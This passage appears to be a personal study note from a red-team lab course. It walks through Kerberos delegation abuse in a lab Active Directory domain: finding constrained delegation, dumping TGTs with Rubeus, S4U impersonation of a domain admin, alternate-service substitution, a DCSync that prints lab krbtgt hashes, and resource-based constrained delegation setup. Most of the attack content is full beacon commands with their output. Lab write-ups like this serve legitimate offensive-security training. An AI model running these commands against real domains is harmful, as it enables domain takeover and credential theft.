  User                  :  DC-2$@DEV.CYBERBOTIC.IO
  StartTime             :  9/6/2022 9:06:14 AM
  EndTime               :  9/6/2022 7:06:14 PM
  RenewTill             :  9/13/2022 9:06:14 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

doIFuj[...]lDLklP
```

_**Machine TGTs are leveraged slightly differently**_ - see the _**S4U2Self Abuse**_ module.  To stop Rubeus, use the <mark style="color:yellow;">`jobs`</mark> and <mark style="color:yellow;">`jobkill`</mark> commands.

## Constrained Delegation

Constrained delegation was later introduced with Windows Server 2003 as a _**safer**_ means for services to perform Kerberos delegation.

Essentially, <mark style="color:red;">it aims to</mark> <mark style="color:red;"></mark>_<mark style="color:red;">**restrict**</mark>_ <mark style="color:red;"></mark><mark style="color:red;">the</mark> <mark style="color:red;"></mark>_<mark style="color:red;">**services**</mark>_ _<mark style="color:red;">**to which the server can act on behalf of a user**</mark>_. <mark style="color:yellow;">It no longer allows the server to cache the TGTs of other users</mark>, <mark style="color:yellow;">but allows it to requests a TGS for another user with its own TGT</mark>.

<figure><img src="../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>

As we can see in <mark style="color:yellow;">`SQL-2`</mark>'s case, this server can act on behalf of any user to the <mark style="color:yellow;">`cifs`</mark> service on <mark style="color:yellow;">`DC-2`</mark>.&#x20;

* `CIFS` is quite powerful as it allows you to list file shares and transfer files

### Finding Computers Configured for Constrained Delegation

In order to <mark style="color:green;">accomplish this</mark>, <mark style="color:green;">we can search for those whose</mark> <mark style="color:yellow;">`msds-allowedtodelegateto`</mark> attribute is _<mark style="color:green;">**not**</mark>_ <mark style="color:green;"></mark><mark style="color:green;">empty</mark>:

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

[*] TOTAL NUMBER OF SEARCH RESULTS: 1
[
  {
    "dnshostname": "sql-2.dev.cyberbotic.io",
    "samaccountname": "SQL-2$",
    "msds-allowedtodelegateto": [
      "cifs/dc-2.dev.cyberbotic.io/dev.cyberbotic.io",
      "cifs/dc-2.dev.cyberbotic.io",
      "cifs/DC-2",
      "cifs/dc-2.dev.cyberbotic.io/DEV",
      "cifs/DC-2/DEV"
    ]
  }
]
```

{% hint style="info" %}
:eyes:

Constrained delegation can be configured on user accounts as well as computer accounts. _**Make sure you search for both**_.
{% endhint %}

:warning: _**In order to do this, I believe you just swap out****&#x20;****`computer`****&#x20;****for****&#x20;****`user`****&#x20;****in the****&#x20;****`objectCategory`****&#x20;****object. I need to look further into this however.**_

### Performing Delegation

_**In order to perform the delegation**_, _**we need the TGT of the principal**_ (computer or user) _**trusted for delegation**_.&#x20;

<mark style="color:green;">**The most**</mark><mark style="color:green;">**&#x20;**</mark>_<mark style="color:green;">**direct**</mark>_<mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**way is to extract the TGT**</mark>**&#x20;using&#x20;**<mark style="color:yellow;">**`rubeus`**</mark>**'&#x20;**<mark style="color:yellow;">**`dump`**</mark>**&#x20;command:**

```
beacon> run hostname
sql-2

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
 --------------------------------------------------------------------------------------------------------------- 
 | LUID    | UserName                    | Service                                       | EndTime              |
 --------------------------------------------------------------------------------------------------------------- 
| 0x3e4    | sql-2$ @ DEV.CYBERBOTIC.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 9/6/2022 7:06:50 PM |

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

    ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
    ServiceRealm             :  DEV.CYBERBOTIC.IO
    UserName                 :  SQL-2$
    UserRealm                :  DEV.CYBERBOTIC.IO
    StartTime                :  9/6/2022 9:06:50 AM
    EndTime                  :  9/6/2022 7:06:50 PM
    RenewTill                :  9/13/2022 9:06:50 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  pj1tbiijFCGHkM6S58ShgxxPi8FvA1UB5liBqrSWPCg=
    Base64EncodedTicket   :

doIFpD[...]MuSU8=
```

{% hint style="info" %}
&#x20;You can also request one with Rubeus <mark style="color:yellow;">`asktgt`</mark> if you have **NTLM** or **AES** hashes.
{% endhint %}

### Performing `S4U2Self` and `S4U2Proxy`

With the TGT, perform an `S4U` request to obtain a usable TGS for `CIFS` on `DC-2`.

{% hint style="warning" %}
Remember, <mark style="color:green;">we can impersonate any user in the domain</mark>, <mark style="color:yellow;">but we want someone who we know is a local admin on the target machine</mark>.
{% endhint %}

In this case, a domain admin makes the most sense (since we're on a Domain Controller).

**The following will perform an&#x20;**<mark style="color:yellow;">**`S4U2Self`**</mark>**&#x20;and&#x20;**<mark style="color:yellow;">**`S4U2Proxy`**</mark>**:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap

[*] Action: S4U

[*] Building S4U2self request for: 'SQL-2$@DEV.CYBERBOTIC.IO'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2self request to 10.10.122.10:88
[+] S4U2self success!
[*] Got a TGS for 'nlamb' to 'SQL-2$@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      doIFnD[...]FMLTIk

[*] Impersonating user 'nlamb' to target SPN 'cifs/dc-2.dev.cyberbotic.io'
[*] Building S4U2proxy request for service: 'cifs/dc-2.dev.cyberbotic.io'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2proxy request to domain controller 10.10.122.10:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc-2.dev.cyberbotic.io':

      doIGaD[...]ljLmlv    <----------- Use this ticket
```

**Syntax:**

* <mark style="color:yellow;">`/impersonateuser`</mark> is the _**user**_ we want to _**impersonate**_.
* <mark style="color:yellow;">`/msdsspn`</mark> is the _**service principal name**_ (SPN) that `SQL-2` is _**allowed to delegate to**_.
* <mark style="color:yellow;">`/user`</mark> is the _**principal**_ _**allowed**_ to _**perform the delegation**_.
* <mark style="color:yellow;">`/ticket`</mark> is the _**TGT**_ for <mark style="color:yellow;">`/user`</mark>.

{% hint style="success" %}
_**The second ticket (which is the****&#x20;****`S4U2Proxy`****&#x20;****ticket) is the one we want for the next steps.**_
{% endhint %}

### Authenticating via `S4U2Proxy` Ticket and Stealing Ticket

**Grab the final&#x20;**<mark style="color:yellow;">**`S4U2Proxy`**</mark>**&#x20;ticket and pass it into a new logon session:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv

[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 5540
[+] Ticket successfully imported!
[+] LUID            : 0x3d3194

beacon> steal_token 5540

beacon> ls \\dc-2.dev.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 15:44:08   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 16:09:55   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/24/2022 10:51:51   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     09/05/2022 17:17:48   ProgramData
          dir     08/15/2022 15:23:23   Recovery
          dir     08/16/2022 12:37:38   Shares
          dir     09/05/2022 12:03:43   System Volume Information
          dir     08/15/2022 15:24:39   Users
          dir     09/05/2022 17:09:56   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 1kb      fil     08/15/2022 16:16:13   dc-2.dev.cyberbotic.io_sub-ca.req
 12kb     fil     09/05/2022 07:25:58   DumpStack.log
 12kb     fil     09/06/2022 09:04:41   DumpStack.log.tmp
 384mb    fil     09/06/2022 09:04:41   pagefile.sys
```

As we can see, we are using the <mark style="color:yellow;">`S4U2Proxy`</mark> ticket, using <mark style="color:yellow;">`createnetonly`</mark> method to spawn <mark style="color:yellow;">`cmd.exe`</mark> using our new <mark style="color:yellow;">`S4U2Proxy`</mark> ticket, we can then steal the token by obtaining the <mark style="color:yellow;">`ProcessID`</mark> and list <mark style="color:yellow;">`dc-2`</mark>'s <mark style="color:yellow;">`c$`</mark> share.&#x20;

#### Debugging

{% hint style="warning" %}
Be sure to always use the FQDN. Otherwise, you will likely see `1326` errors.

```
beacon> ls \\dc-2\c$
[-] could not open \\dc-2\c$\*: 1326 - ERROR_LOGON_FAILURE
```
{% endhint %}

## Alternate Service Name

The `CIFS` service can be leveraged for listing and transferring files, _<mark style="color:yellow;">**but what if port**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`445`**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**was unavailable**</mark>_ (due to `SMB` or something) _<mark style="color:yellow;">**or we wanted an option for lateral movement**</mark>_?

In the _**Kerberos authentication protocol**_, <mark style="color:green;">a service validates an inbound ticket by ensuring that it's encrypted with that service's symmetric key</mark>.

<mark style="color:green;">The key is derived from the password hash of the principal running the service</mark>. _**Most**_ services run in the <mark style="color:yellow;">`SYSTEM`</mark> context of a computer account, (e.g. <mark style="color:yellow;">`SQL-2$`</mark>). Therefore, all service tickets, whether they're for <mark style="color:yellow;">`CIFS`</mark>, <mark style="color:yellow;">`TIME`</mark>, or <mark style="color:yellow;">`HOST`</mark>, etc., will be encrypted with the same key. The SPN does not factor into ticket validation.

**KEY PIECE TO UNDERSTANDING:&#x20;**_**As a result, the&#x20;**<mark style="color:yellow;">**SPN information**</mark>**&#x20;in the&#x20;**<mark style="color:yellow;">**ticket**</mark>**&#x20;(e.g.&#x20;**<mark style="color:yellow;">**the**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`sname`**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**field**</mark>**)&#x20;**<mark style="color:green;">**is not encrypted and can be changed arbitrarily**</mark>**.**_&#x20;

<mark style="color:yellow;">That means that we can request a service ticket for a service</mark>, such as <mark style="color:yellow;">`CIFS`</mark>, <mark style="color:green;">but then modify the SPN to something different</mark>, such as <mark style="color:yellow;">`LDAP`</mark>, <mark style="color:green;">and the target service will accept it happily</mark>.

{% hint style="info" %}
:bulb:

_**This was originally discovered by**_ [_**Alberto Solino**_](https://twitter.com/agsolino) _**and confirmed as "by design" by Microsoft.**_
{% endhint %}

### Exploiting Alternate Services via `Rubeus /altservice`

**We can&#x20;**<mark style="color:red;">**abuse**</mark>**&#x20;this using the&#x20;**<mark style="color:yellow;">**`/altservice`**</mark>**&#x20;flag in `Rubeus`. In this example, we're going to be using the&#x20;**<mark style="color:green;">**same**</mark>**&#x20;**<mark style="color:yellow;">**TGT**</mark>**&#x20;**<mark style="color:green;">**for**</mark>**&#x20;**<mark style="color:yellow;">**`SQL-2`**</mark>**&#x20;**<mark style="color:green;">**to request a**</mark>**&#x20;**<mark style="color:yellow;">**TGS**</mark>**&#x20;**<mark style="color:green;">**for**</mark>**&#x20;**<mark style="color:yellow;">**LDAP**</mark>**&#x20;**<mark style="color:green;">**instead of**</mark>**&#x20;**<mark style="color:yellow;">**`CIFS`**</mark>**:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap

[*] Action: S4U

[*] Building S4U2self request for: 'SQL-2$@DEV.CYBERBOTIC.IO'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2self request to 10.10.122.10:88
[+] S4U2self success!
[*] Got a TGS for 'nlamb' to 'SQL-2$@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      doIFnD[...]FMLTIk

[*] Impersonating user 'nlamb' to target SPN 'cifs/dc-2.dev.cyberbotic.io'
[*]   Final ticket will be for the alternate service 'ldap'
[*] Building S4U2proxy request for service: 'cifs/dc-2.dev.cyberbotic.io'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2proxy request to domain controller 10.10.122.10:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'ldap'
[*] base64(ticket.kirbi) for SPN 'ldap/dc-2.dev.cyberbotic.io':

      doIGaD[...]ljLmlv
			
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
	
[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2580
[+] Ticket successfully imported!
[+] LUID            : 0x4b328e
			
beacon> steal_token 2580
```

**Against the Domain Controller, the LDAP service allows us to perform a `DCSYNC`:**

```
beacon> dcsync dev.cyberbotic.io DEV\krbtgt

[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 8/15/2022 4:01:04 PM
Object Security ID   : S-1-5-21-569305411-121244042-2357301523-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
    ntlm- 0: 9fb924c244ad44e934c390dc17e02c3d
    lm  - 0: 207d5e08551c51892309c0cf652c353b

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e
      aes128_hmac       (4096) : 6fb62ed56c7de778ca5e4fe6da6d3aca
      des_cbc_md5       (4096) : 629189372a372fda
```

Wow :drooling\_face:, what a sweet attack vector this is!!

## `S4U2Self` Abuse

### What is `S4U2Self`?

{% hint style="info" %}
:bulb:

**S4U -> Service for User.**
{% endhint %}

This is an "extension" that <mark style="color:green;">allows a service to obtain a service ticket to itself on behalf of a user</mark>.

As we saw in the previous two examples of [#constrained-delegation](kerberos.md#constrained-delegation "mention"), **there are two different S4U (Service for User) extensions:**

1. <mark style="color:yellow;">**`S4U2Self`**</mark> (Service for User to Self): Allows a service to obtain a TGS _<mark style="color:green;">**to itself on behalf of a user**</mark>_.
2. <mark style="color:yellow;">**`S4U2Proxy`**</mark> (Service for User to Proxy): Allows the service to obtain a TGS _<mark style="color:green;">**on behalf of a user to a second service**</mark>_ (likely using the Kerberos Proxy).

### Thinking back to Constrained Delegation...

When we abused Constrained Delegation, we used the following `Rubeus` syntax:

```
s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$
```

**From the output, we could see that `Rubeus` will do the following:**

1. First builds an <mark style="color:yellow;">`S4U2Self`</mark> request
2. Obtains a TGS for <mark style="color:yellow;">`nlamb`</mark> to <mark style="color:yellow;">`sql-2/dev.cyberbotic.io`</mark>
3. Lastly, builds an <mark style="color:yellow;">`S4U2Proxy`</mark> request to obtain a TGS for <mark style="color:yellow;">`nlamb`</mark> to <mark style="color:yellow;">`cifs/dc-2.dev.cyberbotic.io`</mark>

This is working by design because <mark style="color:yellow;">`SQL-2`</mark> is specifically build for trust with delegation to that service.

### Another way to abuse `S4U2Self`?

However, there's another particularly useful way, published by [Elad Shamir](https://twitter.com/elad_shamir), to abuse the <mark style="color:yellow;">`S4U2Self`</mark> extension - <mark style="color:yellow;">and that is to gain access to a computer if we have its TGT</mark>.

In the [#unconstrained-delegation](kerberos.md#unconstrained-delegation "mention") section, we obtained a TGT for the Domain Controller. <mark style="color:red;">If you tried to pass that ticket into a logon session and use it to access the</mark> <mark style="color:red;"></mark><mark style="color:red;">`C$`</mark> <mark style="color:red;"></mark><mark style="color:red;">share (like we would with a user TGT), it would fail</mark>.

**We can see that attempt below:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:DC-2$ /password:FakePass /ticket:doIFuj[...]lDLklP

[*] Using DEV\DC-2$:FakePass

[*] Showing process : False
[*] Username        : DC-2$
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2832
[+] Ticket successfully imported!
[+] LUID            : 0x4d977f

beacon> steal_token 2832

beacon> ls \\dc-2.dev.cyberbotic.io\c$
[-] could not open \\dc-2.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
```

**This is because machines do not get remote local admin access to themselves.**

#### Rather, what we can do is...

We can <mark style="color:red;">abuse</mark> <mark style="color:yellow;">`S4U2Self`</mark> <mark style="color:green;">to obtain a usable TGS as a user we know is a local admin</mark> (e.g. a Domain Admin).

<mark style="color:yellow;">**`Rubeus`**</mark>**&#x20;has a&#x20;**<mark style="color:yellow;">**`/self`**</mark>**&#x20;flag for this purpose:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

[*] Action: S4U

[*] Building S4U2self request for: 'DC-2$@DEV.CYBERBOTIC.IO'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2self request to 10.10.122.10:88
[+] S4U2self success!
[*] Substituting alternative service name 'cifs/dc-2.dev.cyberbotic.io'
[*] Got a TGS for 'nlamb' to 'cifs@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

doIFyD[...]MuaW8=

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2664
[+] Ticket successfully imported!
[+] LUID            : 0x4ff935

beacon> steal_token 2664

beacon> ls \\dc-2.dev.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 15:44:08   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 16:09:55   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/24/2022 10:51:51   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     09/05/2022 17:17:48   ProgramData
          dir     08/15/2022 15:23:23   Recovery
          dir     08/16/2022 12:37:38   Shares
          dir     09/05/2022 12:03:43   System Volume Information
          dir     08/15/2022 15:24:39   Users
          dir     09/06/2022 15:21:25   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 1kb      fil     08/15/2022 16:16:13   dc-2.dev.cyberbotic.io_sub-ca.req
 12kb     fil     09/05/2022 07:25:58   DumpStack.log
 12kb     fil     09/06/2022 09:04:41   DumpStack.log.tmp
 384mb    fil     09/06/2022 09:04:41   pagefile.sys
```

1. Abuse using <mark style="color:yellow;">`Rubeus`</mark>' <mark style="color:yellow;">`s4u`</mark> module to impersonate a local admin account (in this case is <mark style="color:yellow;">`nlamb`</mark>) to obtain a usable TGS.
2. Use that newly obtained TGS from the local admin account to use `Rubeus`' <mark style="color:yellow;">`createnetonly`</mark> module to create a <mark style="color:yellow;">`cmd.exe`</mark> process (A.K.A. a _**new logon session**_) to grant us a shell with Beacon.
3. Steal that newly spawned <mark style="color:yellow;">`cmd.exe`</mark> PID to perform a token theft attack via <mark style="color:yellow;">`steal_token`</mark> along with PID.
4. Lastly list the contents of `C$` and you'll be able to see its contents.

{% hint style="info" %}
Use <mark style="color:yellow;">`run klist`</mark> to view cached tickets.
{% endhint %}

## Resource-Based Constrained Delegation

Enabling unconstrained or constrained delegation on a computer requires <mark style="color:yellow;">`SeEnableDelegationPrivilege`</mark> user right assignment on Domain Controllers, which is only granted to enterprise and domain admins.

In Windows 2012, a new type of delegation called _**Resource-Based Constrained Delegation (RBCD)**_ was announced.&#x20;

&#x20;_<mark style="color:yellow;">**RBCD allows the delegation configuration to be set on the target rather than the source**</mark>**.**_

### What is the difference?

<mark style="color:yellow;">Constrained Delegation</mark> is configured on the "front-end" service via its <mark style="color:yellow;">`msDS-AllowedToDelegateTo`</mark> attribute.&#x20;

The example provided previously was where `cifs\dc-2.dev.cyberbotic.io` was in the `msDS-AllowedToDelegateTo` attribute of `SQL-2`. This allowed the `SQL-2` computer account to impersonate any user to any service on `DC-2` and `DC-2` really had no "say" over it.

Essentially, <mark style="color:yellow;">RBCD</mark> reverses this concept and puts control in the hands of the "backend" service instead via a new attribute known as <mark style="color:yellow;">`msDS-AllowedToActOnBehalfOfOtherIdentity`</mark> attribute.&#x20;

This attribute <mark style="color:$danger;">does not require</mark> <mark style="color:yellow;">`SeEnableDelegationPrivilege`</mark> to modify.

Instead, **you only need a privilege like** <mark style="color:yellow;">`WriteProperty`</mark>, <mark style="color:yellow;">`GenericWrite`</mark> or <mark style="color:yellow;">`WriteDacl`</mark> on the computer object. This makes it much more likely to present itself as a privilege escalation / lateral movement opportunity.&#x20;

### Prerequisites

1. A target computer on which you can modify <mark style="color:yellow;">`msDS-AllowedToActOnBehalfOfOtherIdentity`</mark>.
2. **Control** of another _**principal**_ that has a <mark style="color:yellow;">`SPN`</mark>.

### How-to

**This query will obtain every domain computer and read their ACL, filtering on the interesting results:**

```
beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

AceQualifier           : AccessAllowed
ObjectDN               : CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights  : Self, WriteProperty
ObjectAceType          : All
ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-569305411-121244042-2357301523-1107
AccessMask             : 40
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers
```

### Obtaining a Principal w/ a SPN

**To start the attack, we need the SID of Workstation 2 (since we have elevated privileges):**

```
beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid

objectsid                                   
---------                                   
S-1-5-21-569305411-121244042-2357301523-1109
```

### Security Descriptor Definition Language (SDDL)

We will then use this SID inside of an SDDL to create a security descriptor.

**The content of&#x20;**<mark style="color:yellow;">**`msDS-AllowedToActOnBehalfOfOtherIdentity`**</mark>**&#x20;must be in raw binary format:**

```
$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"
$rsdb = New-Object byte[] ($rsd.BinaryLength)
$rsd.GetBinaryForm($rsdb, 0)
```

These descriptor bytes can then be used with <mark style="color:yellow;">`Set-DomainObject`</mark>.&#x20;

**However, since we're working through Cobalt Strike, everything must be concatenated into a single PowerShell command:**

```
beacon> powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

Setting 'msDS-AllowedToActOnBehalfOfOtherIdentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 67 233 238 33 138 9 58 7 19 145 129 140 85 4 0 0' for object 'DC-2$'

beacon> powershell Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

Next, we use the <mark style="color:yellow;">`WKSN-2$`</mark> account to perform the <mark style="color:yellow;">`S4U`</mark> impersonation with Rubeus.

The <mark style="color:yellow;">`s4u`</mark> command requires a TGT, RC4, or AES hash.

**Since we already have elevated access to it, we can just extract its TGT from memory:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

[*] Current LUID    : 0x3e7

 ------------------------------------------------------------------------------------------------------------------ 
 | LUID     | UserName                     | Service                                       | EndTime              |
 ------------------------------------------------------------------------------------------------------------------ 
 | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 9/13/2022 7:27:12 PM |

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

[*] Target service  : krbtgt
[*] Target LUID     : 0x3e4
[*] Current LUID    : 0x3e7

  UserName                 : WKSTN-2$
  Domain                   : DEV
  LogonId                  : 0x3e4
  UserSID                  : S-1-5-20
  AuthenticationPackage    : Negotiate
  LogonType                : Service
  LogonTime                : 9/13/2022 9:26:48 AM
  LogonServer              : 
  LogonServerDNSDomain     : 
  UserPrincipalName        : WKSTN-2$@dev.cyberbotic.io

    ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
    ServiceRealm             :  DEV.CYBERBOTIC.IO
    UserName                 :  WKSTN-2$
    UserRealm                :  DEV.CYBERBOTIC.IO
    StartTime                :  9/13/2022 9:27:12 AM
    EndTime                  :  9/13/2022 7:27:12 PM
    RenewTill                :  9/20/2022 9:27:12 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  qEQBH1TdRRjZiZ0iXbeCy4Z3MsOf30l8lLTNE4InemY=
    Base64EncodedTicket   :

doIFuD[...]5JTw==
```

### Perform the `S4U` Attack

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap

[*] Building S4U2self request for: 'WKSTN-2$@DEV.CYBERBOTIC.IO'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2self request to 10.10.122.10:88
[+] S4U2self success!
[*] Got a TGS for 'nlamb' to 'WKSTN-2$@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      doIFoD[...]0yJA==

[*] Impersonating user 'nlamb' to target SPN 'cifs/dc-2.dev.cyberbotic.io'
[*] Building S4U2proxy request for service: 'cifs/dc-2.dev.cyberbotic.io'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2proxy request to domain controller 10.10.122.10:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc-2.dev.cyberbotic.io':

      doIGcD[...]MuaW8=
```

### Finally, Pass the Ticket (PTT) Into a Logon Session for use

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=

[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4092
[+] Ticket successfully imported!
[+] LUID            : 0x6cb934

